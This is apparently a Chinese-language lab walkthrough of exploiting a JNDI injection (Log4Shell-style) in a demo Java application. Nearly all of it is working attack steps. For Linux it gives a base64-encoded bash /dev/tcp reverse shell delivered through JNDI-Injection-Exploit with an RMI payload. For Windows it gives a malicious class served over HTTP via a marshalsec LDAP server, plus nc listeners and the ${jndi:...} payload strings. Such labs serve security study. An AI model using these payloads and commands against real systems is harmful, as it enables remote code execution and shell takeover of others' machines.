Linux 反弹shell:








启动漏洞环境 java –jar demo.jar

默认端口8080

使用java反序列化工具JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar进行利用
首先对反弹shell命令进行编码：

bash -i >& /dev/tcp/192.168.31.168/1234 0>&1

https://www.jackson-t.ca/runtime-exec-payloads.html



之后在攻击机执行：

Java –jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar –C “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjE2OC8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}” –A “192.168.31.168”


同时nc进行监听：

Nc –lvvp 123



因为java版本高于1.8.0_191之后，不会默认开启ldap，所以我们这里需要选择用rmi的方式来进行攻击。

payload=${jndi:rmi://192.168.31.168:1099/ppdzf0}


即可在nc成功反弹linux shell:








windows shell反弹









由于windows没有类似linux下自带的反弹shell命令，所以我们需要准备个恶意类，通过恶意类来进行反弹。




修改ExecTemplateJDK7.java中的ip和端口后，通过javac编译为.class文件。并放置攻击机http服务目录下，通过python3启动http服务


Python3 –m http.server 9092




之后使用nc 监听9091端口


Nc –lvvp 9091


最后使用java反序列化工具marshalsec-0.0.3-SNAPSHOT-all.jar来加载恶意类生成ldap的利用payload



java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.31.188:9092/\#ExecTemplateJDK7 1389




payload=${jndi:ldap://192.168.31.188:1389/ExecTemplateJDK7.class}


对win上运行的漏洞环境进行攻击




即可成功弹回win ncshell。
